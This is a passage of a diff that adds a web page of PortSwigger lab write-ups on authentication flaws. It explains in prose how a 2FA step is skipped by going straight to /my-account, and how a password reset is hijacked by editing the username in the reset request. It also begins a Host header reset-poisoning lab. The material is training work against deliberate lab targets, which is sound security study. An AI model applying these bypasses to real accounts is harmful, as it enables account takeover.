+<p>Given a valid username/password and access to that account's email, as well as a victim username/password, you are asked to bypass the 2FA for the victim's account (you do not have access to their email) and get to their profile page.</p>
+<p>Walking through the auth flow with a valid user is pretty straight foward. You log in at <code>/login</code> and then are directed to <code>/login2</code> to enter the 2FA code. Once you get that from your email, you are redirected to <code>/my-account</code>.</p>
+<p>The "attack" is as simple as completing the first stage with the victim's credentials and then changing the URL to <code>/my-account</code>. This succeeds as there is no session logic to confirm that the 2FA code was entered (only redirection logic).</p>
+<h3 id="password-reset-broken-logic"><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 2a10 10 0 0 1 10 10 10 10 0 0 1-10 10A10 10 0 0 1 2 12 10 10 0 0 1 12 2m0 2a8 8 0 0 0-8 8c0 2.4 1 4.5 2.7 6 1.4-1.3 3.3-2 5.3-2s3.8.7 5.3 2c1.7-1.5 2.7-3.6 2.7-6a8 8 0 0 0-8-8m2 2a1 1 0 0 1 1 1 1 1 0 0 1-1 1 1 1 0 0 1-1-1 1 1 0 0 1 1-1m-4 0a1 1 0 0 1 1 1 1 1 0 0 1-1 1 1 1 0 0 1-1-1 1 1 0 0 1 1-1M6.91 8.94c.13 0 .25.03.39.06l3.2 1.32.27.11c.56-.43 1.32-.55 1.98-.28 1.02.41 1.52 1.58 1.1 2.6a1.992 1.992 0 0 1-2.6 1.1c-.66-.26-1.13-.85-1.25-1.57l-.23-.1-3.22-1.3-.02-.01c-.53-.21-.76-.79-.56-1.31a1 1 0 0 1 .94-.62M17 9a1 1 0 0 1 1 1 1 1 0 0 1-1 1 1 1 0 0 1-1-1 1 1 0 0 1 1-1Z"/></svg></span> Password reset broken logic<a class="headerlink" href="#password-reset-broken-logic" title="Permanent link">&para;</a></h3>
+<div class="admonition question">
+<p class="admonition-title">Question</p>
+<p>This lab's password reset functionality is vulnerable. To solve the lab, reset Carlos's password then log in and access his "My account" page.</p>
+<p>Your credentials: <code>wiener:peter</code>
+Victim's username: <code>carlos</code></p>
+</div>
+<p>Given a valid set of credentials as well as a victim username, you are asked to reset the victim's password and then log in to view the "my account" page.</p>
+<p>Using the valid credentials, I pretended to have forgotton my password and requested a password reset link. I then completed that process and reviewed the <code>POST</code> request to <code>/forgot-password</code>. I noticed the payload had not only the reset token and the new password, but also the username. I sent the request to the repeater, changed the <code>username</code> to the victim username and re-submitted it. The request completed, so I went to the browser, logged in with the victim username and my newly-set password and was able to view the account page.</p>
+<h2 id="websockets">WebSockets<a class="headerlink" href="#websockets" title="Permanent link">&para;</a></h2>
+<h2 id="web-cache-poisoning">Web Cache Poisoning<a class="headerlink" href="#web-cache-poisoning" title="Permanent link">&para;</a></h2>
+<h2 id="insecure-deserialization">Insecure Deserialization<a class="headerlink" href="#insecure-deserialization" title="Permanent link">&para;</a></h2>
+<h2 id="information-disclosure">Information Disclosure<a class="headerlink" href="#information-disclosure" title="Permanent link">&para;</a></h2>
+<h2 id="business-logic-vulnerabilities">Business Logic Vulnerabilities<a class="headerlink" href="#business-logic-vulnerabilities" title="Permanent link">&para;</a></h2>
+<h2 id="http-host-header-attacks">HTTP Host Header Attacks<a class="headerlink" href="#http-host-header-attacks" title="Permanent link">&para;</a></h2>
+<h3 id="basic-password-reset-poisoning">Basic Password Reset Poisoning<a class="headerlink" href="#basic-password-reset-poisoning" title="Permanent link">&para;</a></h3>
+<p>We are told that <code>carlos</code> will click any link in any email he receives. The goal is to log in to Carlos's account.</p>
+<p>We are given a valid set of credentials.</p>
+<p>Given the title of the challenge, I'm assuming that in the <code>POST</code> request to reset my password, there will be a header that can be manipulated or maybe in the password reset link.</p>
+<h2 id="oauth-authentication">OAuth Authentication<a class="headerlink" href="#oauth-authentication" title="Permanent link">&para;</a></h2>
+
+  <hr>
+<div class="md-source-file">
+  <small>
+    
+      Last update:
+      <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-iso_datetime">2022-05-24 12:45:27</span>
+      
+    
+  </small>
+</div>
+
+              
+            </article>
+          </div>
+        </div>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+    <nav class="md-footer__inner md-grid" aria-label="Footer">
+      
+        
+        <a href="rzeroctf.html" class="md-footer__link md-footer__link--prev" aria-label="Previous: RingZer0 Team Online CTF" rel="prev">
+          <div class="md-footer__button md-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12Z"/></svg>
+          </div>
+          <div class="md-footer__title">
+            <div class="md-ellipsis">
+              <span class="md-footer__direction">
+                Previous
+              </span>
+              RingZer0 Team Online CTF
+            </div>
+          </div>
+        </a>
+      
+      
+        
+        <a href="ps-accesscontrol.html" class="md-footer__link md-footer__link--next" aria-label="Next: Access Control" rel="next">
+          <div class="md-footer__title">
+            <div class="md-ellipsis">
+              <span class="md-footer__direction">
+                Next
+              </span>
+              Access Control
+            </div>
+          </div>
+          <div class="md-footer__button md-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M4 11v2h12l-5.5 5.5 1.42 1.42L19.84 12l-7.92-7.92L10.5 5.5 16 11H4Z"/></svg>
+          </div>
+        </a>
+      
+    </nav>
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+    <div class="md-copyright__highlight">
+      Copyright &copy; 2021-2022 Rob Gillen
+    </div>
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+        <div class="md-social">
+  
+    
+    
+      
+      
+    
+    <a href="https://github.com/argodev" target="_blank" rel="noopener" title="github.com" class="md-social__link">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 480 512"><!--! Font Awesome Free 6.1.1 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc.--><path d="M186.1 328.7c0 20.9-10.9 55.1-36.7 55.1s-36.7-34.2-36.7-55.1 10.9-55.1 36.7-55.1 36.7 34.2 36.7 55.1zM480 278.2c0 31.9-3.2 65.7-17.5 95-37.9 76.6-142.1 74.8-216.7 74.8-75.8 0-186.2 2.7-225.6-74.8-14.6-29-20.2-63.1-20.2-95 0-41.9 13.9-81.5 41.5-113.6-5.2-15.8-7.7-32.4-7.7-48.8 0-21.5 4.9-32.3 14.6-51.8 45.3 0 74.3 9 108.8 36 29-6.9 58.8-10 88.7-10 27 0 54.2 2.9 80.4 9.2 34-26.7 63-35.2 107.8-35.2 9.8 19.5 14.6 30.3 14.6 51.8 0 16.4-2.6 32.7-7.7 48.2 27.5 32.4 39 72.3 39 114.2zm-64.3 50.5c0-43.9-26.7-82.6-73.5-82.6-18.9 0-37 3.4-56 6-14.9 2.3-29.8 3.2-45.1 3.2-15.2 0-30.1-.9-45.1-3.2-18.7-2.6-37-6-56-6-46.8 0-73.5 38.7-73.5 82.6 0 87.8 80.4 101.3 150.4 101.3h48.2c70.3 0 150.6-13.4 150.6-101.3zm-82.6-55.1c-25.8 0-36.7 34.2-36.7 55.1s10.9 55.1 36.7 55.1 36.7-34.2 36.7-55.1-10.9-55.1-36.7-55.1z"/></svg>
+    </a>
+  
+    
+    
+      
+      
+    
+    <a href="https://twitter.com/argodev" target="_blank" rel="noopener" title="twitter.com" class="md-social__link">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!--! Font Awesome Free 6.1.1 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc.--><path d="M459.37 151.716c.325 4.548.325 9.097.325 13.645 0 138.72-105.583 298.558-298.558 298.558-59.452 0-114.68-17.219-161.137-47.106 8.447.974 16.568 1.299 25.34 1.299 49.055 0 94.213-16.568 130.274-44.832-46.132-.975-84.792-31.188-98.112-72.772 6.498.974 12.995 1.624 19.818 1.624 9.421 0 18.843-1.3 27.614-3.573-48.081-9.747-84.143-51.98-84.143-102.985v-1.299c13.969 7.797 30.214 12.67 47.431 13.319-28.264-18.843-46.781-51.005-46.781-87.391 0-19.492 5.197-37.36 14.294-52.954 51.655 63.675 129.3 105.258 216.365 109.807-1.624-7.797-2.599-15.918-2.599-24.04 0-57.828 46.782-104.934 104.934-104.934 30.213 0 57.502 12.67 76.67 33.137 23.715-4.548 46.456-13.32 66.599-25.34-7.798 24.366-24.366 44.833-46.132 57.827 21.117-2.273 41.584-8.122 60.426-16.243-14.292 20.791-32.161 39.308-52.628 54.253z"/></svg>
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    <script id="__config" type="application/json">{"base": "..", "features": [], "search": "../assets/javascripts/workers/search.2a1c317c.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.config.lang": "en", "search.config.pipeline": "trimmer, stopWordFilter", "search.config.separator": "[\\s\\-]+", "search.placeholder": "Search", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version.title": "Select version"}}</script>
+    
+    
+      <script src="../assets/javascripts/bundle.efad133d.min.js"></script>
+      
+        <script src="../javascripts/mathjax.js"></script>
+      
+        <script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script>
+      
+        <script src="../javascripts/tex-mml-chtml.js"></script>
+      
+        <script src="../javascripts/mermaid.min.js"></script>
+      
+    
+  </body>
+</html>
